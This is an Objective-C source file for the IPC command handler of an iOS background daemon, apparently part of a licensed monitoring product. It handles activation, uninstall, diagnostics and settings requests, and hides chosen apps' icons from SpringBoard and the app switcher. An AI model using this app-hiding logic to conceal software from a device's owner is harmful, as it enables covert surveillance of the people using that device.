//
//  AppEngineConnection.m
//  AppEngine
//
//  Created by Makara Khloth on 11/19/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import "AppEngineConnection.h"
#import "AppEngine.h"
#import "AppEngineUICmd.h"
#import "PreferencesData.h"

// Components headers
#import "ComponentHeaders.h"

// Socket IPC
#import "SocketIPCSender.h"
#import "ProductMetaData.h"
#import "ProductActivationData.h"
#import "MessagePortIPCSender.h"

#import "DefStd.h"
#import "ExtraLogger.h"

@interface AppEngineConnection (private)
- (void) sendDataToUI: (NSData*) aData;
- (void) sendActivationFailureToUI: (NSData *) aData;
@end

@implementation AppEngineConnection

@synthesize mUICommandCode;

- (id) initWithAppEngine: (AppEngine*) aAppEngine {
	if ((self = [super init])) {
		mAppEngine = aAppEngine;
		[mAppEngine retain];
		
		// Listen to UI command
//		mEngineSocket = [[SocketIPCReader alloc] initWithPortNumber:kAppUISendSocketPort andAddress:kLocalHostIP withSocketDelegate:self];
//		[mEngineSocket start];
		mEngineMessagePort = [[MessagePortIPCReader alloc] initWithPortName:kAppUISendMessagePort withMessagePortIPCDelegate:self];
		[mEngineMessagePort start];
	}
	return (self);
}

#pragma mark -
#pragma mark Obsolete
#pragma mark -

- (void) processCommand: (NSInteger) aCmdId withCmdData: (id) aCmdData {
	NSInteger command = aCmdId;
	NSMutableData *commandData = [NSMutableData data];
	[commandData appendBytes:&command length:sizeof(NSInteger)];
	switch (aCmdId) {
		case kAppUI2EngineGetLicenseInfoCmd: {
			LicenseInfo *licInfo = aCmdData;
			NSData *licInfoData = [licInfo transformToData];
			[commandData appendData:licInfoData];
			[self sendDataToUI:commandData];
		} break;
		default:
			break;
	}
}

#pragma mark -
#pragma mark Socket IPC
#pragma mark -

// Socket IPC
- (void) dataDidReceivedFromSocket: (NSData*) aRawData {
	DLog(@"(AppEngine) dataDidReceivedFromSocket")
}

#pragma mark -
#pragma mark Message port IPC
#pragma mark -

// Message port IPC
- (void) dataDidReceivedFromMessagePort: (NSData*) aRawData {
	DLog(@"Daemon received command data... ");
	// First 4 bytes always command
	NSInteger uiCommand = kAppUI2EngineUnknownCmd;
	if (aRawData) {
		NSInteger location = 0;
		[aRawData getBytes:&uiCommand length:sizeof(NSInteger)];
		location += sizeof(NSInteger);
		
		DLog(@"Daemon received command data, dataDidReceivedFromMessagePort uiCommand: %ld", (long)uiCommand)
		
		[self setMUICommandCode:uiCommand];
		
		NSRange range = NSMakeRange(location, [aRawData length] -location);
		
		NSMutableData *responseData = [NSMutableData data];
		[responseData appendBytes:&uiCommand length:sizeof(NSInteger)];
		
		switch (uiCommand) {
			case kAppUI2EngineActivateCmd: {
				// Activate
				NSData *commandData = [aRawData subdataWithRange:range];
				NSInteger location = 0;
				NSInteger length = 0;
				[commandData getBytes:&length length:sizeof(NSInteger)];
				location += sizeof(NSInteger);
				NSString *activationCode = [[NSString alloc] initWithData:[commandData subdataWithRange:NSMakeRange(location, length)]
																 encoding:NSUTF8StringEncoding];
				
				//DLog(@"Got activation code from ui: %@", activationCode)
				ActivationInfo *activationInfo = [[ActivationInfo alloc] init];
				[activationInfo setMActivationCode:activationCode];
				[activationInfo setMDeviceInfo:[[[mAppEngine mApplicationContext] getPhoneInfo] getDeviceInfo]];
				[activationInfo setMDeviceModel:[[[mAppEngine mApplicationContext] getPhoneInfo] getDeviceModel]];
				BOOL isSubmit = [[mAppEngine mActivationManager] activate:activationInfo andListener:self];
				//DLog(@"Command activate from ui is sent to server successfully: %d", isSubmit)
				if (!isSubmit) {
					// Notify back to UI
					[self sendActivationFailureToUI:responseData];
				}
				[activationInfo release];
				[activationCode release];
			} break;
			case kAppUI2EngineRequestActivateCmd: {
				// Request activate
				BOOL isSubmit = [[mAppEngine mActivationManager] requestActivate:self];
				if (!isSubmit) {
					// Notify back to UI
					[self sendActivationFailureToUI:responseData];
				}
			} break;
			case kAppUI2EngineDeactivateCmd: {
				// Deactivate
				BOOL isSubmit = [[mAppEngine mActivationManager] deactivate:self];
				if (!isSubmit) {
					// Notify back to UI
					[self sendActivationFailureToUI:responseData];
					
					// -------- Considering to force deactivate here ----------
				} else {
                    DLog(@"DEACTIVATE by UI")
                    DLog(@"writeToFileDeactivateWithData 0")
                    ExtraLogger* logger = [[ExtraLogger alloc] init];
                    [logger writeToFileDeactivateWithData:@"0"];
                    [logger release];
                }
			} break;
			case kAppUI2EngineUninstallCmd: {
				// Uninstall
				id <AppContext> appContext = [mAppEngine mApplicationContext];
                id <AppVisibility> appVisibility = [appContext getAppVisibility];
                [appVisibility uninstallApplication];
			} break;
			case kAppUI2EngineGetAboutCmd: {
				// Get about
				LicenseManager *licenseManager = [mAppEngine mLicenseManager];
				LicenseInfo *licInfo = [licenseManager mCurrentLicenseInfo];
				NSInteger configID = [licInfo configID];
				if ([licInfo licenseStatus] == EXPIRED) {
//					configID = CONFIG_EXPIRE_LICENSE;
				} else if ([licInfo licenseStatus] == DISABLE) {
//					configID = CONFIG_DISABLE_LICENSE;
				}
				
				ProductMetaData *pMetaData = [[ProductMetaData alloc] init];
				[pMetaData setMConfigID:configID];
				[pMetaData setMProductID:[[[mAppEngine mApplicationContext] getProductInfo] getProductID]];
				[pMetaData setMProtocolLanguage:[[[mAppEngine mApplicationContext] getProductInfo] getLanguage]];
				[pMetaData setMProtocolVersion:[[[mAppEngine mApplicationContext] getProductInfo] getProtocolVersion]];
				[pMetaData setMProductVersion:[[[mAppEngine mApplicationContext] getProductInfo] getProductVersion]];
				[pMetaData setMProductName:[[[mAppEngine mApplicationContext] getProductInfo] getProductName]];
				[pMetaData setMProductDescription:[[[mAppEngine mApplicationContext] getProductInfo] getProductDescription]];
				[pMetaData setMProductLanguage:[[[mAppEngine mApplicationContext] getProductInfo] getProductLanguage]];
				[pMetaData setMLicenseHashTail:[[[mAppEngine mApplicationContext] getProductInfo] getProtocolHashTail]];
				[pMetaData setMProductVersionDescription:[[[mAppEngine mApplicationContext] getProductInfo] getProductVersionDescription]];
				NSData *metaData = [pMetaData transformToData];
				[responseData appendData:metaData];
				[self sendDataToUI:responseData];
				[pMetaData release];
				[self setMUICommandCode:kAppUI2EngineUnknownCmd];
			} break;
			case kAppUI2EngineGetCurrentSettingsCmd: {
				// Get current settings
				PreferencesData *pData = [[PreferencesData alloc] init];
				NSData *preferenceData = [pData transformToDataFromPrefereceManager:[mAppEngine mPreferenceManager]];
				[responseData appendData:preferenceData];
				[self sendDataToUI:responseData];
				[pData release];
				[self setMUICommandCode:kAppUI2EngineUnknownCmd];
			} break;
			case kAppUI2EngineGetLastConnectionsCmd: {
				// Get last connections
				NSData *connectionLogsData = [[mAppEngine mConnectionHistoryManager] transformAllConnectionHistoryToData];
				[responseData appendData:connectionLogsData];
				[self sendDataToUI:responseData];
				[self setMUICommandCode:kAppUI2EngineUnknownCmd];
			} break;
			case kAppUI2EngineGetLicenseInfoCmd: {
				// Get license info
				LicenseManager *licenseManager = [mAppEngine mLicenseManager];
				LicenseInfo *licInfo = [licenseManager mCurrentLicenseInfo];
				// Copy license info to UI
				LicenseInfo *licInfoUI = [[LicenseInfo alloc] init];
				[licInfoUI setActivationCode:[licInfo activationCode]];
				[licInfoUI setMd5:[licInfo md5]];
				[licInfoUI setLicenseStatus:[licInfo licenseStatus]];
				[licInfoUI setConfigID:[licInfo configID]];
				if ([licInfo licenseStatus] == EXPIRED) {
//					[licInfoUI setConfigID:CONFIG_EXPIRE_LICENSE];
				} else if ([licInfo licenseStatus] == DISABLE) {
//					[licInfoUI setConfigID:CONFIG_DISABLE_LICENSE];
				}
				// Send data to UI
				NSData *licInfoData = [licInfoUI transformToData];
				[responseData appendData:licInfoData];
				[self sendDataToUI:responseData];
				[licInfoUI release];
				[self setMUICommandCode:kAppUI2EngineUnknownCmd];
			} break;
			case kAppUI2EngineGetDiagnosticCmd: {
				NSData *eventCountData = [[[mAppEngine mERM] eventCount] transformToData];
				NSData *dbHealthInfoData = [[[mAppEngine mERM] dbHealthInfo] transformToData];
				NSArray *allConnectionHistory = [[mAppEngine mConnectionHistoryManager] selectAllConnectionHistory];
				ConnectionLog *lastConnectionLog = [allConnectionHistory lastObject];
				NSString *lastConnectionTime = [lastConnectionLog mDateTime];
				NSInteger length = [eventCountData length];
				
				// Event count
				[responseData appendBytes:&length length:sizeof(NSInteger)];
				[responseData appendData:eventCountData];
				//DLog(@"Length of eventCountData: %d", length)
				//DLog(@"eventCountData: %@", eventCountData)
				
				// Database health
				length = [dbHealthInfoData length];
				[responseData appendBytes:&length length:sizeof(NSInteger)];
				[responseData appendData:dbHealthInfoData];
				//DLog(@"Length of dbHealthInfoData: %d", length)
				//DLog(@"dbHealthInfoData: %@", dbHealthInfoData)
				
				// Last connections history
				length = [lastConnectionTime lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
				[responseData appendBytes:&length length:sizeof(NSInteger)];
				[responseData appendData:[lastConnectionTime dataUsingEncoding:NSUTF8StringEncoding]];
				//DLog(@"Length of lastConnectionTime data using encoding UTF8: %d", length)
				[self sendDataToUI:responseData];
				[self setMUICommandCode:kAppUI2EngineUnknownCmd];
			} break;
			case kAppUI2EngineVisibilityCmd: {
				DLog (@"Process command visibility...");
				NSInteger loc = 0;
				NSData *commandData = [aRawData subdataWithRange:range];
				NSInteger count = 0;
				[commandData getBytes:&count length:sizeof(NSInteger)];
				loc += sizeof(NSInteger);
				
				PrefVisibility *prefVis = (PrefVisibility *)[[mAppEngine mPreferenceManager] preference:kVisibility];
				NSMutableArray *viss = [NSMutableArray arrayWithArray:[prefVis mVisibilities]];
				
				for (NSInteger i = 0; i < count; i++) {
					Visible *vis = [[[Visible alloc] init] autorelease];
					
					NSInteger len = 0;
					[commandData getBytes:&len range:NSMakeRange(loc, sizeof(NSInteger))];
					loc += sizeof(NSInteger);
					
					NSData *subData = [commandData subdataWithRange:NSMakeRange(loc, len)];
					NSString *bundleIdentifier = [[NSString alloc] initWithData:subData encoding:NSUTF8StringEncoding];
					loc += len;
					
					[vis setMBundleIdentifier:bundleIdentifier];
					[bundleIdentifier release];
					
					BOOL visible = NO;
					[commandData getBytes:&visible range:NSMakeRange(loc, sizeof(BOOL))];
					loc += sizeof(BOOL);
					
					[vis setMVisible:visible];
					
					// Find old visibility
					BOOL newVis = YES;
					for (Visible *v in viss) {
						if ([[v mBundleIdentifier] isEqualToString:[vis mBundleIdentifier]]) {
							[v setMVisible:visible];
							newVis = NO;
							break;
						}
					}
					
					if (newVis) [viss addObject:vis];
				}
				
				// Set to preference
				[prefVis setMVisibilities:viss];
				[[mAppEngine mPreferenceManager] savePreference:prefVis];
				DLog (@"prefVis mVisible = %d, mVisibilities = %@", [prefVis mVisible], [prefVis mVisibilities]);
				DLog (@"hiddenBundleIdentifiers = %@", [prefVis hiddenBundleIdentifiers]);
				DLog (@"shownBundleIdentifiers = %@", [prefVis shownBundleIdentifiers]);
				
				// Hide these invisible applications
				id <AppVisibility> visibility = [[mAppEngine mApplicationContext] getAppVisibility];
				[visibility hideApplicationIconFromAppSwitcherSpringBoard:[prefVis hiddenBundleIdentifiers]];
				[visibility showApplicationIconInAppSwitcherSpringBoard:[prefVis shownBundleIdentifiers]];
				[visibility applyAppVisibility];
				[self setMUICommandCode:kAppUI2EngineUnknownCmd];
			} break;
            case kAppUI2EngineSystemCoreVisibilityCmd: {
                DLog (@"Process command System Core visibility...");
				NSInteger loc = 0;
				NSData *commandData = [aRawData subdataWithRange:range];
				NSInteger count = 0;
				[commandData getBytes:&count length:sizeof(NSInteger)];
				loc += sizeof(NSInteger);
				
				NSMutableArray *viss = [NSMutableArray array];
				for (NSInteger i = 0; i < count; i++) {
					Visible *vis = [[[Visible alloc] init] autorelease];
					
					NSInteger len = 0;
					[commandData getBytes:&len range:NSMakeRange(loc, sizeof(NSInteger))];
					loc += sizeof(NSInteger);
                    
					NSData *subData = [commandData subdataWithRange:NSMakeRange(loc, len)];
					NSString *bundleIdentifier = [[NSString alloc] initWithData:subData encoding:NSUTF8StringEncoding];
					loc += len;
					
					[vis setMBundleIdentifier:bundleIdentifier];
					[bundleIdentifier release];
                    
					BOOL visible = NO;
					[commandData getBytes:&visible range:NSMakeRange(loc, sizeof(BOOL))];
					loc += sizeof(BOOL);
					
					[vis setMVisible:visible];
                    [viss addObject:vis];
				}
                
                id <PreferenceManager> prefManager = [mAppEngine mPreferenceManager];
                PrefVisibility *prefVisibility = (PrefVisibility *)[prefManager preference:kVisibility];
                [prefVisibility setMVisible:[[viss objectAtIndex:0] mVisible]];
                [prefManager savePreferenceAndNotifyChange:prefVisibility];
                [self setMUICommandCode:kAppUI2EngineUnknownCmd];
            } break;
			default:
				[self setMUICommandCode:kAppUI2EngineUnknownCmd];
				break;
		}
	}
}

#pragma mark -
#pragma mark Activation manager
#pragma mark -

- (void) onComplete:(ActivationResponse *)aActivationResponse {
	DLog(@"aActivationResponse.isMSuccess: %d", [aActivationResponse isMSuccess])
	NSInteger command = kAppUI2EngineUnknownCmd;
	if ([aActivationResponse mEchoCommand] == SEND_ACTIVATE) {
		command = kAppUI2EngineActivateCmd;
	} else if ([aActivationResponse mEchoCommand] == GET_ACTIVATION_CODE) {
		command = kAppUI2EngineRequestActivateCmd;
	} else {
		command = kAppUI2EngineDeactivateCmd;
	}
	NSMutableData *responseData = [NSMutableData data];
	[responseData appendBytes:&command length:sizeof(NSInteger)];
	ProductActivationData *pActivationData = [[ProductActivationData alloc] init];
	[pActivationData setMIsSuccess:[aActivationResponse isMSuccess]];
	if ([aActivationResponse isMSuccess]) {
		[pActivationData setMErrorCode:[aActivationResponse mResponseCode]];
	} else {
		if ([aActivationResponse mHTTPStatusCode] != 0) {
			[pActivationData setMErrorCode:[aActivationResponse mHTTPStatusCode]];
		} else {
			[pActivationData setMErrorCode:[aActivationResponse mResponseCode]];
		}
	}
	
	LicenseManager *licenseManager = [mAppEngine mLicenseManager];
	
	[pActivationData setMErrorCategory:kFxErrorNone];
	[pActivationData setMErrorDescription:[aActivationResponse mMessage]];
	[pActivationData setMLicenseInfo:[licenseManager mCurrentLicenseInfo]];
	
	//==== Force to deactivate...
	if (command == kAppUI2EngineDeactivateCmd &&
		![aActivationResponse isMSuccess]) {
		DLog (@"Force deactivate the product...")
		[licenseManager resetLicense];
		[pActivationData setMIsSuccess:YES];
		[pActivationData setMErrorCode:0];
		[pActivationData setMLicenseInfo:[licenseManager mCurrentLicenseInfo]];
	}
	///----------------
	
	NSData *data = [pActivationData transformToData];
	[responseData appendData:data];
	[self sendDataToUI:responseData];
	[pActivationData release];
	[self setMUICommandCode:kAppUI2EngineUnknownCmd];
}

#pragma mark -
#pragma mark Private methods
#pragma mark -

- (void) sendDataToUI: (NSData*) aData {
	DLog(@"aData: %@", aData)
//	SocketIPCSender* socketSender = [[SocketIPCSender alloc] initWithPortNumber:kAppEngineSendSocketPort andAddress:kLocalHostIP];
//	[socketSender writeDataToSocket:aData];
//	[socketSender release];
	
	MessagePortIPCSender* messagePortSender = [[MessagePortIPCSender alloc] initWithPortName:kAppEngineSendMessagePort];
	[messagePortSender writeDataToPort:aData];
	[messagePortSender release];
}

- (void) sendActivationFailureToUI: (NSData *) aData {
	NSMutableData *responseData = [NSMutableData dataWithData:aData];
	ProductActivationData *pActivationData = [[ProductActivationData alloc] init];
	[pActivationData setMErrorCode:kActivationManagerBusy];
	[pActivationData setMErrorCategory:kFxErrorActivationManager];
	[pActivationData setMErrorDescription:NSLocalizedString(@"kActivationManagerBusyInvalidActivationInfo", @"")];
	NSData *data = [pActivationData transformToData];
	[responseData appendData:data];
	[self sendDataToUI:responseData];
	[pActivationData release];
	[self setMUICommandCode:kAppUI2EngineUnknownCmd];
}

#pragma mark -
#pragma mark Memory management
#pragma mark -

- (void) dealloc {
	[mEngineMessagePort release];
	[mEngineSocket release];
	[mAppEngine release];
	[super dealloc];
}

@end
